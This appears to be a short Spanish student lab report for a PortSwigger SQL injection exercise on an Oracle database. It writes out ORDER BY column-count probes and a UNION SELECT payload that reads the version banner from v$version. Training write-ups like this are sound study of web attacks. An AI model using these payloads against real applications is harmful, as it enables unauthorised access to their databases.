# Reto-Christian_Sangucho
Reto_Laboratio_SQLi

# README_CHRISTIAN_SANGUCHO_DIAZ
# INFORME LABORATORIO https://portswigger.net/

## Laboratorio:
Ataque de inyección SQL, consultando el tipo y la versión de la base de datos en Oracle

## Objetivo:
Conseguir la versión de Oracle

##Consulta Original: 
SELECT * FROM articles WHERE category = ‘Gifts’


## Consulta Manipulada:
Se busca el número de columnas con las siguientes instrucciones
‘ ORDER BY 1
‘ ORDER BY 2
‘ ORDER BY 3


! [Imagen búsqueda de número de columnas con error](https://github.com/christiansangucho/Reto-Christian_Sangucho/blob/main/Imagen%20b%C3%BAsqueda%20de%20n%C3%BAmero%20de%20columnas%20con%20error.png)
! [Imagen búsqueda de número de columnas](https://github.com/christiansangucho/Reto-Christian_Sangucho/blob/main/Imagen%20b%C3%BAsqueda%20de%20n%C3%BAmero%20de%20columnas.png)

## Consulta para obtener la versión de Oracle
=Gifts' UNION SELECT banner, 'NULL' FROM v$version--

! [Imagen de la Version Oracle]()
